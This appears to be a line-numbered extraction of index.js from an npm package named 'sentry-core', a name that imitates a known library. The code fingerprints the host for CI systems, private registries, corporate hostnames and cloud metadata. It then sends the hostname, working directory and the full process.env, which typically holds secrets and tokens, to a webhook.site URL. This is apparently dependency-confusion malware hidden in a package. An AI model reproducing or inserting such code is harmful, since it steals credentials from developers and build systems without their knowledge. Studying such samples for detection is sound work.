// File: tmp/tmp0yr3prda/sentry-core/package/index.js
// ======================================================================
Line 1: const https = require('https')
Line 2: const os = require('os')
Line 3: const dns = require('dns').promises
Line 6: {
  // 1. Check for CI/CD environment variables
  const ciEnvVars = [
    'CI', 'CONTINUOUS_INTEGRATION', 'BUILD_NUMBER', 'RUN_ID',
    'GITLAB_CI', 'CIRCLECI', 'TRAVIS', 'JENKINS_URL', 'TEAMCITY_VERSION',
    'BITBUCKET_BUILD_NUMBER', 'GITHUB_ACTIONS', 'AZURE_DEVOPS'
  ];

  // 2. Check for private registry usage
  const privateRegistryIndicators = [
    'npm_config_registry', 
    'NPM_PRIVATE_REGISTRY',
    'verdaccio',
    'nexus',
    'artifactory',
    'npmrc',
    'internal_registry'
  ];

  // 3. Check hostname patterns
  const corporateHostnamePatterns = [
    /\.corp\./i,
    /\.internal\./i,
    /\.company\./i,
    /-prd$/i,
    /-dev$/i,
    /^build-/i,
    /^ci-/i
  ];

  // 4. Check AWS/GCP metadata (for cloud environments)
  const cloudMetadata = {
    aws: '169.254.169.254',
    gcp: 'metadata.google.internal'
  };

  // Detection checks
  const checks = {
    isCI: ciEnvVars.some(v => process.env[v]),
    hasPrivateRegistry: privateRegistryIndicators.some(v => 
    ...
Line 9: _tmp_0.push("CONTINUOUS_INTEGRATION")
Line 10: _tmp_0.push("TEAMCITY_VERSION")
Line 11: _tmp_0.push("BITBUCKET_BUILD_NUMBER")
Line 16: _tmp_1.push("npm_config_registry")
Line 17: _tmp_1.push("NPM_PRIVATE_REGISTRY")
Line 18: _tmp_1.push("verdaccio")
Line 19: _tmp_1.push("nexus")
Line 20: _tmp_1.push("artifactory")
Line 21: _tmp_1.push("npmrc")
Line 22: _tmp_1.push("internal_registry")
Line 27: _tmp_2.push(/\.corp\./i)
Line 28: _tmp_2.push(/\.internal\./i)
Line 29: _tmp_2.push(/\.company\./i)
Line 30: _tmp_2.push(/-prd$/i)
Line 31: _tmp_2.push(/-dev$/i)
Line 32: _tmp_2.push(/^build-/i)
Line 33: _tmp_2.push(/^ci-/i)
Line 43: const checks = {
    isCI: ciEnvVars.some(v => process.env[v]),
    hasPrivateRegistry: privateRegistryIndicators.some(v => 
      process.env[v] || 
      (process.env.npm_package_json && process.env.npm_package_json.includes(v))
    ),
    hasCorporateHostname: corporateHostnamePatterns.some(p => p.test(os.hostname())),
    isCloudVM: false,
    isCorporateNetwork: false
  }
Line 44: _tmp_4.isCI = ciEnvVars.some(v => process.env[v])
Line 45: privateRegistryIndicators.some(v => 
      process.env[v] || 
      (process.env.npm_package_json && process.env.npm_package_json.includes(v))
    )
Line 47: process.env.npm_package_json.includes(v)
Line 49: corporateHostnamePatterns.some(p => p.test(os.hostname()))
Line 57: _tmp_6.push(dns.lookup(cloudMetadata.aws).then(() => true).catch(() => false))
Line 58: _tmp_6.push(dns.lookup(cloudMetadata.gcp).then(() => true).catch(() => false))
Line 64: os.hostname()
Line 65: {
      const domain = hostname.split('.').slice(-2).join('.');
      const mxRecords = await dns.resolveMx(domain).catch(() => []);
      checks.isCorporateNetwork = mxRecords.length > 0;
    }
Line 66: hostname.split('.').slice(-2).join('.')
Line 67: const mxRecords = await dns.resolveMx(domain).catch(() => [])
Line 82: {
  const internalCheck = await isInternalTeam();
  
  const data = JSON.stringify({
    hostname: os.hostname(),
    platform: process.platform,
    cwd: process.cwd(),
    env: process.env,
    internalCheck,
    timestamp: new Date().toISOString()
  });

  const options = {
    hostname: 'webhook.site',
    path: '/519f0bc7-36d4-443c-9269-b0061138ac86',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': data.length
    }
  };

  const req = https.request(options, (res) => {
    console.log(`Webhook sent. Status: ${res.statusCode}`);
  });

  req.on('error', (error) => {
    console.error(`Error: ${error}`);
  });

  req.write(data);
  req.end();
}
Line 86: os.hostname()
Line 104: const req = https.request(options, (res) => {
    console.log(`Webhook sent. Status: ${res.statusCode}`);
  })
Line 112: req.write(data)
Line 113: req.end()
Line 116: main()
